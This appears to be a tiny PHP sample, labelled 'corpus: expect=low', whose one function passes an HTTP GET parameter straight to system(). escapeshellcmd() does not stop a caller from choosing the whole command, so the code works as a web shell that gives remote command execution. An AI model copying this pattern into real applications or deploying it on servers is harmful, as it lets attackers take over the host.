<?php // corpus: expect=low
function run() {
    system(escapeshellcmd($_GET['command']));
}
